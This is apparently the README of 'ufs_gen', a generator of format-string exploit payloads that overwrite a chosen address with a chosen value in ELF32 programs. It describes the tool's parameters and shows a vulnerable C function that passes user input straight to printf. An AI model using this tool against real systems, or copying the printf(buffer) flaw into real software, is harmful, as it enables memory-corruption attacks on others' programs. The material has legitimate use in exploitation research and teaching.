ufs_gen
=======

This software allows you to generate a payload which may override an address
with the value of your choice.

The syntax is quite simple:

There are three parameters needed for the program to run correctly.

stackidx: this parameter specifies how many dwords you need to access the
beginning of your buffer (or payload).

override: the address to override

with: the value to inject at the address overriden

This software is intended to work with an ELF32 generated by a typical code.

example:

int function(const char *payload)
{
    char buffer[BUFSIZ];

    strncpy(buffer, payload, sizeof(buffer));
    buffer[sizeof(buffer) - 1] = '\0';

    printf(buffer);

    return 0;
}

The support of ELF64 and other formats is intended but not written yet.
Although the option 'addrsize' might already be used to specify if an address
is not 4 bytes long, there is very few chances that it would work correctly.

The support of printf(payload) directly (i.e. without a temporary buffer) is 
also planned.
